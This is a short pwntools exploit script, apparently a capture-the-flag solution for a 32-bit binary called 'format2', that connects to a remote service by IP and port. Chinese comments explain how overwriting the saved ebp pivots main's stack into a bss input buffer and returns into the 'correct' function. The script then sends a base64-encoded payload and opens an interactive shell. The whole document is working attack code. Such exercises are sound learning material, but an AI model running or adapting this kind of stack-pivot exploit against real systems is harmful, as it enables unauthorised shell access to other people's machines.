from pwn import *  
import base64  
  
context.log_level = 'debug'  
#sh = process('./format2')  
sh = remote("61.147.171.105",53717)  
elf = ELF('./format2')  
#bss段的input区域  
input_addr = elf.sym['input']  
getshell_addr = elf.sym['correct'] + 0x19  
  
sh.recvuntil('Authenticate :')  
  
#覆盖auth函数的ebp内容，也就是修改了上一个函数的ebp，使得上一个函数(main)的ebp指向了input_addr  
#那么，当main函数leave时，有  
#mov esp,ebp  ;esp = input_addr  
#pop ebp  ;ebp = aaaa  
#retn ; call getshell_addr  
payload = b'a'*4 + p32(getshell_addr) + p32(input_addr)  
  
sh.sendline(base64.b64encode(payload))  
  
sh.interactive() 